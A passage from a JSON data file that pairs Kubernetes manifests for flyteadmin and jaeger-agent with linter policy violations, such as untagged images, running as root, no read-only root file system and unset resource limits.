    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redoc\" is using an invalid container image, \"docker.io/redocly/redoc\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11359",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"flyteadmin\" does not have a read-only root file system"
  },
  {
    "id": "11360",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redoc\" does not have a read-only root file system"
  },
  {
    "id": "11361",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"run-migrations\" does not have a read-only root file system"
  },
  {
    "id": "11362",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"flyteadmin\" not found"
  },
  {
    "id": "11363",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"flyteadmin\" is not set to runAsNonRoot"
  },
  {
    "id": "11364",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redoc\" is not set to runAsNonRoot"
  },
  {
    "id": "11365",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"run-migrations\" is not set to runAsNonRoot"
  },
  {
    "id": "11366",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"flyteadmin\" has cpu request 0"
  },
  {
    "id": "11367",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redoc\" has cpu request 0"
  },
  {
    "id": "11368",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"run-migrations\" has cpu request 0"
  },
  {
    "id": "11369",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"flyteadmin\" has memory limit 0"
  },
  {
    "id": "11370",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteadmin\n  namespace: flyte\n  labels:\n    app: flyteadmin\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteadmin\n  template:\n    metadata:\n      labels:\n        app: flyteadmin\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '10254'\n        prometheus.io/path: /metrics\n    spec:\n      serviceAccountName: flyteadmin\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      - name: config-volume\n        configMap:\n          name: flyte-admin-config\n      initContainers:\n      - name: run-migrations\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - migrate\n        - run\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      containers:\n      - name: flyteadmin\n        image: docker.io/lyft/flyteadmin:v0.2.3\n        imagePullPolicy: IfNotPresent\n        command:\n        - flyteadmin\n        - --logtostderr\n        - --config\n        - /etc/flyte/config/flyteadmin_config.yaml\n        - serve\n        ports:\n        - containerPort: 8088\n        - containerPort: 8089\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        - name: config-volume\n          mountPath: /etc/flyte/config\n      - name: redoc\n        image: docker.io/redocly/redoc\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8087\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: '0.1'\n        command:\n        - sh\n        - -c\n        - ln -s /usr/share/nginx/html /usr/share/nginx/html/openapi && sh /usr/local/bin/docker-run.sh\n        env:\n        - name: PAGE_TITLE\n          value: Flyte Admin OpenAPI\n        - name: SPEC_URL\n          value: /api/v1/openapi\n        - name: PORT\n          value: '8087'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"run-migrations\" has memory limit 0"
  },
  {
    "id": "11371",
    "manifest_path": "data/manifests/the_stack_sample/sample_4378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: '{{ .Values.agent.image }}'\n        args:\n        - --reporter.grpc.host-port=jaeger-logzio-collector:14250\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jaeger-agent\" is using an invalid container image, \"{{ .Values.agent.image }}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11372",
    "manifest_path": "data/manifests/the_stack_sample/sample_4378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: '{{ .Values.agent.image }}'\n        args:\n        - --reporter.grpc.host-port=jaeger-logzio-collector:14250\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jaeger-agent\" does not have a read-only root file system"
  },
  {
    "id": "11373",
    "manifest_path": "data/manifests/the_stack_sample/sample_4378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: '{{ .Values.agent.image }}'\n        args:\n        - --reporter.grpc.host-port=jaeger-logzio-collector:14250\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jaeger-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "11374",
    "manifest_path": "data/manifests/the_stack_sample/sample_4378.yaml",
